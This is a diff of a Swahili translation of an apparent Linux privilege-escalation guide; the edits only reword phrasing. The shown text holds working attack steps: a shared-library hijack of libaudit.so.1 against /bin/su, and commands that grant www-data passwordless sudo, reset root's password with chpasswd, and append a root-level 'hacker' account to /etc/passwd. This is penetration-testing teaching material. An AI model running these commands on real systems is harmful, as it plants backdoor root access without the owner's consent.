@@ -44,18 +44,18 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## Kuandika upya faili ili kuongeza privileges
+## Kuandika juu ya faili ili kuongeza privileges
 
 ### Faili za kawaida
 
-- Add user mwenye password kwenye _/etc/passwd_
+- Ongeza user aliye na password kwenye _/etc/passwd_
 - Badilisha password ndani ya _/etc/shadow_
-- Add user kwenye sudoers katika _/etc/sudoers_
-- Abuse docker kupitia docker socket, kwa kawaida katika _/run/docker.sock_ au _/var/run/docker.sock_
+- Ongeza user kwenye sudoers katika _/etc/sudoers_
+- Tumia vibaya docker kupitia docker socket, kwa kawaida katika _/run/docker.sock_ au _/var/run/docker.sock_
 
-### Kuandika upya library
+### Kuandika juu ya library
 
-Check library inayotumiwa na binary fulani, katika hali hii `/bin/su`:
+Kagua library inayotumiwa na binary fulani, katika hali hii `/bin/su`:
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -67,8 +67,8 @@ libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
 libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-Katika hali hii, hebu tujaribu kujifanya kuwa `/lib/x86_64-linux-gnu/libaudit.so.1`.\
-Kwa hiyo, angalia functions za library hii zinazotumiwa na binary ya **`su`**:
+Katika hali hii, hebu tujaribu kuiga `/lib/x86_64-linux-gnu/libaudit.so.1`.\
+Kwa hivyo, angalia functions za library hii zinazotumiwa na binary ya **`su`**:
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Alama `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` na `audit_fd` huenda zimetoka kwenye library ya libaudit.so.1. Kwa kuwa libaudit.so.1 itafutwa na shared library hasidi, alama hizi zinapaswa kuwepo kwenye shared library mpya; vinginevyo programu haitaweza kupata alama hiyo na itatoka.
+Alama `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` na `audit_fd` huenda zinatoka kwenye library ya libaudit.so.1. Kwa kuwa libaudit.so.1 itafutwa na shared library hasidi, alama hizi zinapaswa kuwepo kwenye shared library mpya; vinginevyo program haitaweza kupata alama hiyo na itatoka.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -112,7 +112,7 @@ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers
 ```bash
 echo "root:hacked" | chpasswd
 ```
-### Ongeza mtumiaji mpya wa root kwenye /etc/passwd
+### Ongeza user mpya wa root kwenye /etc/passwd
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
